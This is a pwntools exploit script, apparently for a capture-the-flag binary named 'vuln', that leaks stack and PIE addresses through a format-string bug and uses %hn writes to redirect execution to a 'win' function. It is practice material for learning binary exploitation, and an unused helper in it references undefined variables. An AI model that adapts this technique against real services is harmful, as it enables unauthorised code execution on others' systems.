#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x125E
continue
"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.39.so")

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

sla(b'twice\n', b'%20$p%27$p')
stack_leak = int(io.recv(14).decode(),16)
log.info(hex(stack_leak - 0x168))
pie_leak = int(io.recv(14).decode(),16)

elf.address = pie_leak - 0x11b3
log.info(hex(elf.address))

log.info(hex(elf.sym.win))
def overwrite(addr, val):
    # test for offset
    # payload = b'%8$p%9$p%10$p'
    # payload = payload.ljust(16,b'B') + b"A" * 8

    # Writing Loop
    payload = f'%{val}x%10$hn'.encode()

    payload = payload.ljust(16, b"A") + p64(addr)
    sla(b'first name:', payload)

    # payload = b'%12$p%13$p%14$p'
    # payload = payload.ljust(16,b'B') + b"A" * 8

    global printf_rip
    printf_rip -= 0x68
    log.info(hex(printf_rip))
    payload = f'%{last_2_bytes}x%14$hn'.encode()
    # Pad the payload with zero bytes
    payload = payload.ljust(16, b"A") + p64(printf_rip)
    sla(b'last name:', payload)

payload = f'%{(elf.sym.win + 0x18) & 0xffff}x%8$hn'.encode() 
payload = payload.ljust(16, b'A') + p64(stack_leak - 0x168)
payload = payload.ljust(0x78, b'\x00')
# overwrite(stack_leak - 0xd8, elf.sym.win)
sl(payload)
io.interactive()

